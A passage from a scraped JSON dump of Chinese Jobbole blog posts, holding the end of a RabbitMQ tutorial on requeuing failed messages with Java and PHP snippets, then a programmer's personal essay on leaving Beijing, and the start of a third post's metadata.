class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f5223918138-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f5223918138-15\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0029 seconds] -->\r\n<p></p>\n<h4>失败任务重试</h4>\n<p>如果任务重试三次仍未成功，则会被投递到失败队列，这时候需要人工处理程序异常，处理完毕后，需要将消息重新投递到队列进行处理，这里唯一需要做的就是从失败队列订阅消息，然后获取到消息后，清空其<code>application_headers</code>头信息，然后重新投递到<code>master</code>这个Exchange即可。</p>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51f9555641458\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchannel.basicPublish(\r\n    'master', \r\n    envelope.getRoutingKey(),\r\n    MessageProperties.PERSISTENT_BASIC,\r\n    body\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f9555641458-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f9555641458-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f9555641458-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f9555641458-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51f9555641458-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51f9555641458-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f9555641458-1\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f9555641458-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f9555641458-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f9555641458-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">MessageProperties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PERSISTENT_BASIC</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51f9555641458-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">body</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51f9555641458-6\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51fc684238168\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$msg-&gt;set('application_headers', new AMQPTable([]));\r\n$this-&gt;channel-&gt;basic_publish(\r\n    $msg,\r\n    'master',\r\n    $msg-&gt;get('routing_key')\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51fc684238168-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51fc684238168-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51fc684238168-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51fc684238168-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51fc684238168-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51fc684238168-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51fc684238168-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'application_headers'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AMQPTable</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51fc684238168-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51fc684238168-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51fc684238168-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51fc684238168-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'routing_key'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51fc684238168-6\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h3>怎么使用</h3>\n<p>队列和Exchange以及发布订阅的关系我们就说完了，那么使用起来是什么效果呢？这里我们以Java代码为例</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51ff804049889\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 发布消息\r\nPublisher publisher = new Publisher(factory.newConnection(), 'master');\r\npublisher.publish(\"{\\\"id\\\":121, \\\"name\\\":\\\"guanyiyao\\\"}\", \"user.create\");\r\n\r\n// 订阅消息\r\nnew Subscriber(factory.newConnection(), Main.EXCHANGE_NAME)\r\n    .init(\"user-monitor\", \"user.*\")\r\n    .subscribe((message, routingKey) -&gt; {\r\n        // TODO 业务逻辑\r\n        System.out.printf(\"     message consumed: %s\\n\", routingKey, message);\r\n    }\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51ff804049889-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51ff804049889-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51ff804049889-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51ff804049889-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51ff804049889-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51ff804049889-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51ff804049889-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51ff804049889-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51ff804049889-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51ff804049889-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51ff804049889-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51ff804049889-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51ff804049889-1\"><span class=\"crayon-c\">// 发布消息</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51ff804049889-2\"><span class=\"crayon-e\">Publisher </span><span class=\"crayon-v\">publisher</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Publisher</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">factory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newConnection</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51ff804049889-3\"><span class=\"crayon-v\">publisher</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"{\\\"id\\\":121, \\\"name\\\":\\\"guanyiyao\\\"}\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"user.create\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51ff804049889-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51ff804049889-5\"><span class=\"crayon-c\">// 订阅消息</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51ff804049889-6\"><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Subscriber</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">factory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newConnection</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Main</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EXCHANGE_NAME</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51ff804049889-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">init</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"user-monitor\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"user.*\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51ff804049889-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">subscribe</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51ff804049889-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// TODO 业务逻辑</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51ff804049889-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"     message consumed: %s\\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51ff804049889-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51ff804049889-12\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p></p>\n<h2>总结</h2>\n<p>使用RabbitMQ时，实现延时重试和失败队列的方式并不仅仅局限于本文中描述的方法，如果读者有更好的实现方案，欢迎拍砖，在这里我也只是抛砖引玉了。本文中讲述的方法还有很多优化空间，读者也可以试着去改进其实现方案，比如本文中使用了三个Exchagne，是否只使用一个Exchange也能实现本文中所讲述的功能。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/e8b93699352c7d38fa1d9d15a95ba461.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/2197f30341190c0c9daab43dd2d4ce0c.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113984\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113984votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113984\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/mylxsw\">管宜尧</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/mylxsw\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/691a6775e88ff962fd90f229d711d0da.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            PHP程序猿，常用网络ID为mylxsw，具有6年以上PHP研发经验，专注于PHP，Golang以及Linux生态、微服务架构等方向，对技术比较执着，经常会写一些博文分享自己的所学，目前就职于重庆允升科技有限公司。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/mylxsw\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/mylxsw/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/mylxsw/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"https://aicode.cc\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/code404\"><i class=\"fa fa-weibo\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/mylxsw\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/a4ef892dcc22d6d944ae2c4ec2d3472908ff01eb.jpg"},{"url_object_id": "c4156eb16689abd02ccd4f571b73594d", "title": ["IT程序员的抉择：我要离开帝都了"], "url": "http://blog.jobbole.com/114136/", "create_date": "2018/06/21", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/career.jpg"], "praise_nums": "1", "comment_nums": 4, "fav_nums": 0, "tags": "职场, 职业生涯", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/mazhimazhi/p/9190218.html\">做我自己的主人</a>   </div><div id=\"cnblogs_post_body\">\n<p>不知不觉在北京已经漂泊了近5年了，共为3家公司打过工，其中有几十人的小公司，也有几万人的大公司。随着工作技能的提升和工作经验的积累，薪水自然也涨了不少，但是看着北京的房价、物价飞涨，感觉自己赚多少都是小钱，还不如尽早卷铺盖回内蒙老家发展。那里毕竟是老家，亲戚朋友相对多一点。随着年龄的增长，也想有个自己的家了。</p>\n<p>之前犹犹豫豫的好长时间，不知道自己是留是走，今天还是详细的罗列了两个地方发展的坏处：</p>\n<h3>呆在北京坏处：</h3>\n<p>（1）工作压力大</p>\n<p>尤其是互联网公司，研发需求还是比较多的，有些需求还比较急，清闲的时候少。不过现在觉得还好，技术上有很大的进步，能独立扛事儿，一般的IT研发岗位还是可以得心应手的。</p>\n<p>（2）房价高，落户难</p>\n<p>在北京落户，有一套自己的房子，这想都不敢想了。看着日益飙高的房价和近乎不可能满足的帝都落户条件，如果要呆在北京发展，那注定一辈子只能租房了，像我的同学一样，在偏远一点的地方租个小两居，再买个<br>\n15万以下的车代步，总感觉这不是我想要的生活。</p>\n<p>（3）空气差，雾霾严重</p>\n<p>每天吸雾霾，我都不知道的少活多少年了。随着年龄的增长，感觉身体才最重要，尤其是看到认识的人得了重病后更感觉身体的宝贵。如果继续呆在帝都的话，那也只能是天天吸了。</p>\n<p>（4）漂泊孤独感</p>\n<p>没亲戚，只有几个在大学交好的同学，不过现在也都各忙各的，聚的少，大部分时间还是自己一个人。工作这么多年，也少有能交心的同事。一直感觉自己的生活过的并不快乐，也许有个人陪伴会好很多吧。</p>\n<p>（5）离父母太远</p>\n<p>父母已经上年纪了，而且也不希望离他们太远，万一有个病痛啥的，照顾实在不方便。</p>\n<h3>呆在内蒙坏处：</h3>\n<p>（1）知名IT企业少，岗位技术含量低</p>\n<p>去年中旬专门休了年假回内蒙面试了几家IT公司，挑来挑去还是选择回京继续工作。主要是外包的多，充其量也就给企业做定制化软件，有的还要求驻场开发，几乎没有做自家产品的。这种性质的岗位貌<br>\n似也不轻松。</p>\n<p>（2）薪水低</p>\n<p>薪水和帝都比起来，都不能用腰斩来形容了，要1万都觉得太多，这个心理落差的承受，而且内蒙还不是强制单位上五险一金，所以只有2家公司有五险一金，而且按最低额度缴纳。如果没有房贷，车贷，这个薪水也不是不能接受。这些年在北京也赚了一点钱，再找父母凑点，房子还是能勉强买的起的。</p>\n<p>（3）容易不满足现状，不甘心</p>\n<p>如果岗位技术含量低，而且活儿还多的话，肯定干不长久。而且本人很喜欢技术，很爱在技术上玩儿点高端的。哎，实在不行就自个儿干吧，写写技术书，录录网络课程啥的，相对来说即能选择性学习一些<br>\n感兴趣的技术，又不至于饿死吧。</p>\n<p>（4）空气干燥，对某些植物过敏，容易引发过敏性鼻炎</p>\n<p>内蒙是没有雾霾，但是有沙尘暴，而且为了绿化植被，防止沙漠化，种了一些叫不上名的植物，我很过敏。</p>\n<p>（5）回去容易出来难</p>\n<p>我30出头的年龄，回去肯定要成家的，有家了出来可就难了。</p>\n<p>反正选择在哪个地方发展坏处都不少。但是这么多年在北京奋斗，我感觉除了看上北京的工作机会，就再也没有让我留恋的东西了。我要辞职了，我要离开北京了，再见！2018.6.16</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114136\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114136votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114136\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/18fc86594a34c2bebbefd765480669feb0504c69.jpg"},{"url_object_id": "a994858569521b3cc4c7ef650140ad3c", "title": ["计算机专业太难不适合女生学？来看 N 多小姐姐的回应"], "url": "http://blog.jobbole.com/114141/", "create_date": "2018/06/22", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/cebf98169b4fd1e38a35c3537129ceaa.jpg"], "praise_nums": "1", "comment_nums": 4, "fav_nums": 2, "tags": "职场, 程序员, 计算机专业", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" 